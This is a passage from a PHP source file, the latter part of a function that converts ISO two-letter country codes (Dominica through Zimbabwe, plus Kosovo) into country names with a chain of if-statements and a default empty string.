if ($code == 'DM') return 'Dominica';
if ($code == 'DO') return 'Dominican Republic';
if ($code == 'EC') return 'Ecuador';
if ($code == 'EG') return 'Egypt';
if ($code == 'SV') return 'El Salvador';
if ($code == 'GQ') return 'Equatorial Guinea';
if ($code == 'ER') return 'Eritrea';
if ($code == 'EE') return 'Estonia';
if ($code == 'ET') return 'Ethiopia';
if ($code == 'FO') return 'Faroe Islands';
if ($code == 'FK') return 'Falkland Islands (Malvinas)';
if ($code == 'FJ') return 'Fiji the Fiji Islands';
if ($code == 'FI') return 'Finland';
if ($code == 'FR') return 'France, French Republic';
if ($code == 'GF') return 'French Guiana';
if ($code == 'PF') return 'French Polynesia';
if ($code == 'TF') return 'French Southern Territories';
if ($code == 'GA') return 'Gabon';
if ($code == 'GM') return 'Gambia the';
if ($code == 'GE') return 'Georgia';
if ($code == 'DE') return 'Germany';
if ($code == 'GH') return 'Ghana';
if ($code == 'GI') return 'Gibraltar';
if ($code == 'GR') return 'Greece';
if ($code == 'GL') return 'Greenland';
if ($code == 'GD') return 'Grenada';
if ($code == 'GP') return 'Guadeloupe';
if ($code == 'GU') return 'Guam';
if ($code == 'GT') return 'Guatemala';
if ($code == 'GG') return 'Guernsey';
if ($code == 'GN') return 'Guinea';
if ($code == 'GW') return 'Guinea-Bissau';
if ($code == 'GY') return 'Guyana';
if ($code == 'HT') return 'Haiti';
if ($code == 'HM') return 'Heard Island and McDonald Islands';
if ($code == 'VA') return 'Holy See (Vatican City State)';
if ($code == 'HN') return 'Honduras';
if ($code == 'HK') return 'Hong Kong';
if ($code == 'HU') return 'Hungary';
if ($code == 'IS') return 'Iceland';
if ($code == 'IN') return 'India';
if ($code == 'ID') return 'Indonesia';
if ($code == 'IR') return 'Iran';
if ($code == 'IQ') return 'Iraq';
if ($code == 'IE') return 'Ireland';
if ($code == 'IM') return 'Isle of Man';
if ($code == 'IL') return 'Israel';
if ($code == 'IT') return 'Italy';
if ($code == 'JM') return 'Jamaica';
if ($code == 'JP') return 'Japan';
if ($code == 'JE') return 'Jersey';
if ($code == 'JO') return 'Jordan';
if ($code == 'KZ') return 'Kazakhstan';
if ($code == 'KE') return 'Kenya';
if ($code == 'KI') return 'Kiribati';
if ($code == 'KP') return 'Korea';
if ($code == 'KR') return 'Korea';
if ($code == 'KW') return 'Kuwait';
if ($code == 'KG') return 'Kyrgyz Republic';
if ($code == 'LA') return 'Lao';
if ($code == 'LV') return 'Latvia';
if ($code == 'LB') return 'Lebanon';
if ($code == 'LS') return 'Lesotho';
if ($code == 'LR') return 'Liberia';
if ($code == 'LY') return 'Libyan Arab Jamahiriya';
if ($code == 'LI') return 'Liechtenstein';
if ($code == 'LT') return 'Lithuania';
if ($code == 'LU') return 'Luxembourg';
if ($code == 'MO') return 'Macao';
if ($code == 'MK') return 'Macedonia';
if ($code == 'MG') return 'Madagascar';
if ($code == 'MW') return 'Malawi';
if ($code == 'MY') return 'Malaysia';
if ($code == 'MV') return 'Maldives';
if ($code == 'ML') return 'Mali';
if ($code == 'MT') return 'Malta';
if ($code == 'MH') return 'Marshall Islands';
if ($code == 'MQ') return 'Martinique';
if ($code == 'MR') return 'Mauritania';
if ($code == 'MU') return 'Mauritius';
if ($code == 'YT') return 'Mayotte';
if ($code == 'MX') return 'Mexico';
if ($code == 'FM') return 'Micronesia';
if ($code == 'MD') return 'Moldova';
if ($code == 'MC') return 'Monaco';
if ($code == 'MN') return 'Mongolia';
if ($code == 'ME') return 'Montenegro';
if ($code == 'MS') return 'Montserrat';
if ($code == 'MA') return 'Morocco';
if ($code == 'MZ') return 'Mozambique';
if ($code == 'MM') return 'Myanmar';
if ($code == 'NA') return 'Namibia';
if ($code == 'NR') return 'Nauru';
if ($code == 'NP') return 'Nepal';
if ($code == 'AN') return 'Netherlands Antilles';
if ($code == 'NL') return 'Netherlands the';
if ($code == 'NC') return 'New Caledonia';
if ($code == 'NZ') return 'New Zealand';
if ($code == 'NI') return 'Nicaragua';
if ($code == 'NE') return 'Niger';
if ($code == 'NG') return 'Nigeria';
if ($code == 'NU') return 'Niue';
if ($code == 'NF') return 'Norfolk Island';
if ($code == 'MP') return 'Northern Mariana Islands';
if ($code == 'NO') return 'Norway';
if ($code == 'OM') return 'Oman';
if ($code == 'PK') return 'Pakistan';
if ($code == 'PW') return 'Palau';
if ($code == 'PS') return 'Palestinian Territory';
if ($code == 'PA') return 'Panama';
if ($code == 'PG') return 'Papua New Guinea';
if ($code == 'PY') return 'Paraguay';
if ($code == 'PE') return 'Peru';
if ($code == 'PH') return 'Philippines';
if ($code == 'PN') return 'Pitcairn Islands';
if ($code == 'PL') return 'Poland';
if ($code == 'PT') return 'Portugal, Portuguese Republic';
if ($code == 'PR') return 'Puerto Rico';
if ($code == 'QA') return 'Qatar';
if ($code == 'RE') return 'Reunion';
if ($code == 'RO') return 'Romania';
if ($code == 'RU') return 'Russian Federation';
if ($code == 'RW') return 'Rwanda';
if ($code == 'BL') return 'Saint Barthelemy';
if ($code == 'SH') return 'Saint Helena';
if ($code == 'KN') return 'Saint Kitts and Nevis';
if ($code == 'LC') return 'Saint Lucia';
if ($code == 'MF') return 'Saint Martin';
if ($code == 'PM') return 'Saint Pierre and Miquelon';
if ($code == 'VC') return 'Saint Vincent and the Grenadines';
if ($code == 'WS') return 'Samoa';
if ($code == 'SM') return 'San Marino';
if ($code == 'ST') return 'Sao Tome and Principe';
if ($code == 'SA') return 'Saudi Arabia';
if ($code == 'SN') return 'Senegal';
if ($code == 'RS') return 'Serbia';
if ($code == 'SC') return 'Seychelles';
if ($code == 'SL') return 'Sierra Leone';
if ($code == 'SG') return 'Singapore';
if ($code == 'SK') return 'Slovakia (Slovak Republic)';
if ($code == 'SI') return 'Slovenia';
if ($code == 'SB') return 'Solomon Islands';
if ($code == 'SO') return 'Somalia, Somali Republic';
if ($code == 'ZA') return 'South Africa';
if ($code == 'GS') return 'South Georgia and the South Sandwich Islands';
if ($code == 'ES') return 'Spain';
if ($code == 'LK') return 'Sri Lanka';
if ($code == 'SD') return 'Sudan';
if ($code == 'SR') return 'Suriname';
if ($code == 'SJ') return 'Svalbard & Jan Mayen Islands';
if ($code == 'SZ') return 'Swaziland';
if ($code == 'SE') return 'Sweden';
if ($code == 'CH') return 'Switzerland, Swiss Confederation';
if ($code == 'SY') return 'Syrian Arab Republic';
if ($code == 'TW') return 'Taiwan';
if ($code == 'TJ') return 'Tajikistan';
if ($code == 'TZ') return 'Tanzania';
if ($code == 'TH') return 'Thailand';
if ($code == 'TL') return 'Timor-Leste';
if ($code == 'TG') return 'Togo';
if ($code == 'TK') return 'Tokelau';
if ($code == 'TO') return 'Tonga';
if ($code == 'TT') return 'Trinidad and Tobago';
if ($code == 'TN') return 'Tunisia';
if ($code == 'TR') return 'Turkey';
if ($code == 'TM') return 'Turkmenistan';
if ($code == 'TC') return 'Turks and Caicos Islands';
if ($code == 'TV') return 'Tuvalu';
if ($code == 'UG') return 'Uganda';
if ($code == 'UA') return 'Ukraine';
if ($code == 'AE') return 'United Arab Emirates';
if ($code == 'GB') return 'United Kingdom';
if ($code == 'US') return 'United States of America';
if ($code == 'UM') return 'United States Minor Outlying Islands';
if ($code == 'VI') return 'United States Virgin Islands';
if ($code == 'UY') return 'Uruguay, Eastern Republic of';
if ($code == 'UZ') return 'Uzbekistan';
if ($code == 'VU') return 'Vanuatu';
if ($code == 'VE') return 'Venezuela';
if ($code == 'VN') return 'Vietnam';
if ($code == 'WF') return 'Wallis and Futuna';
if ($code == 'EH') return 'Western Sahara';
if ($code == 'YE') return 'Yemen';
if ($code == 'XK') return 'Kosovo';
if ($code == 'ZM') return 'Zambia';
if ($code == 'ZW') return 'Zimbabwe';
return '';
}    
?>
